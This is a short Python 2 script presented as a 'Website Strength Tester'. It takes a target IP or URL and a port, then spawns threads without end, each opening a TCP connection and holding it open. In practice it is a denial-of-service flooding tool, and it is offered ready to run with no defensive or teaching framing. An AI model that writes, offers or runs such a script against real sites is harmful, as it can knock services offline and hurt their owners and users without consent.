"""
Website Strength Tester
 
Written by Slater River
 
iNamer Version 0.2
"""
from os import *
from socket import *
from string import *
from random import *
from time import *
from thread import *
 
print "\a"
print " "
print "Starting service. Please wait. . . ."
print " "
 
# insert website info
host = raw_input("IP Address Or Website URL:  ") # insert desired ip address or url
print " "
port = int(input("Insert Port Number: ")) # insert desired port number ex. port 8080
print " "
 
# connection to open sockets
def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sleep(99999)
        sock1.close
    except:
        print "The Site Is Down!"
 
n = 9999999999999
 
while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print "Your Connection Is Weak. Try Restarting The Script."
    print "Thank You For Using iNamer! Have a Wonderful Day!"
    sleep(0.1)